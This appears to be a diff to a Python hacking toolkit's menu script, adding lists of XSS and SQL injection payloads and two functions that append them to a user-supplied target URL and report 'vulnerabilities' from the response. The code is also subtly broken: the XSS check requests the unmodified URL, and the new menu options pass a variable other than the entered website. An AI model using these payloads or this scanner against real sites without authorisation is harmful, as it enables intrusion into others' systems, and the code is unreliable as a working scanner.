@@ -4,10 +4,42 @@ import time
 import requests
 from colorama import Fore
 import webbrowser
+from urllib.parse import urljoin
 
 os.system('cls' if os.name == 'nt' else 'clear')
 
 colorama.init(autoreset=True)
+
+xss_payloads = [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "'><script>alert(1)</script>"
+]
+
+sql_payloads = [
+    "' OR '1'='1",
+    "' OR '1'='1' --",
+    "' OR '1'='1' #",
+    "' OR '1'='1"
+]
+
+def payload_scan_xss(url):
+    for payload in xss_payloads:
+        url_payload_scanner_xss = f"{url}{payload}"
+        response = requests.get(url)
+        if payload in response.text:
+            print(f"{Fore.GREEN}[+] XSS Vulnerability Found at: {url_payload_scanner_xss}")
+        else:
+            print(f"{Fore.RED}[-] No XSS at: {url_payload_scanner_xss}")
+
+def payload_scan_sql(url):
+    for payload in sql_payloads:
+        url_payload_scanner_sql = f"{url}{payload}"
+        response = requests.get(url_payload_scanner_sql)
+        if "sql" in response.text.lower() or "syntax" in response.text.lower():
+            print(f"{Fore.GREEN}[+] SQL Injection Vulnerability Found at: {url_payload_scanner_sql}")
+        else:
+            print(f"{Fore.RED}[-] No SQL Injection at: {url_payload_scanner_sql}")
 
 def url_scanner_checker(url, valid_file, invalid_file):
     try:
@@ -50,7 +82,7 @@ if main_load == "1":
         main_menu_screen = rf"""
         {Fore.RED}██╗  ██╗{Fore.BLUE}██████╗ ██╗   ██╗ ██████╗
         {Fore.RED}╚██╗██╔╝{Fore.BLUE}██╔══██╗██║   ██║██╔════╝ 
-        {Fore.RED} ╚███╔╝ {Fore.BLUE}██████╔╝██║   ██║██║  ███╗  {Fore.WHITE}Version = {Fore.GREEN}1.2 
+        {Fore.RED} ╚███╔╝ {Fore.BLUE}██████╔╝██║   ██║██║  ███╗  {Fore.WHITE}Version = {Fore.GREEN}1.3
         {Fore.RED} ██╔██╗ {Fore.BLUE}██╔══██╗██║   ██║██║   ██║  {Fore.WHITE}Lastest Version: {Fore.GREEN}True
         {Fore.RED}██╔╝ ██╗{Fore.BLUE}██████╔╝╚██████╔╝╚██████╔╝
         {Fore.RED}╚═╝  ╚═╝{Fore.BLUE}╚═════╝  ╚═════╝  ╚═════╝ 
@@ -63,7 +95,9 @@ if main_load == "1":
         [{Fore.RED}0{Fore.BLUE}3{Fore.WHITE}] {Fore.RED}WayBackArchive {Fore.YELLOW}Instant{Fore.WHITE}
         [{Fore.RED}0{Fore.BLUE}4{Fore.WHITE}] {Fore.GREEN}Blind XSS {Fore.WHITE}Full {Fore.RED}Account{Fore.WHITE} TakeOver {Fore.RED}( Tutorial ){Fore.WHITE}
         [{Fore.RED}0{Fore.BLUE}5{Fore.WHITE}] {Fore.YELLOW}PDF {Fore.WHITE}Stored {Fore.GREEN}XSS{Fore.WHITE}
-        [{Fore.RED}0{Fore.BLUE}6{Fore.WHITE}] {Fore.WHITE}URL {Fore.RED}Scanner {Fore.WHITE}
+        [{Fore.RED}0{Fore.BLUE}6{Fore.WHITE}] {Fore.WHITE}URL {Fore.RED}Scanner{Fore.WHITE}
+        [{Fore.RED}0{Fore.BLUE}7{Fore.WHITE}] {Fore.GREEN}XSS {Fore.YELLOW}Payload {Fore.WHITE}Scanner{Fore.WHITE}
+        [{Fore.RED}0{Fore.BLUE}8{Fore.WHITE}] {Fore.BLUE}SQL {Fore.YELLOW}Payload {Fore.WHITE}Scanner{Fore.WHITE}
         """
         print(main_menu_screen)
         main_menu_screen_choice = input("</#root\> ")
@@ -171,5 +205,19 @@ if main_load == "1":
             for url in urls:
                 url_scanner_checker(url, valid_file, invalid_file)
 
+            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
+            os.system('cls' if os.name == 'nt' else 'clear')
+
+        elif main_menu_screen_choice == "7":
+            print("with parameter (http://site.com/index.php?id=):")
+            website_target_xss = input("Website: ")
+            payload_scan_xss(url)
+            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
+            os.system('cls' if os.name == 'nt' else 'clear')
+
+        elif main_menu_screen_choice == "8":
+            print("with parameter (http://site.com/index.php?id=):")
+            website_target_xss = input("Website: ")
+            payload_scan_sql(url)
             input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
             os.system('cls' if os.name == 'nt' else 'clear')
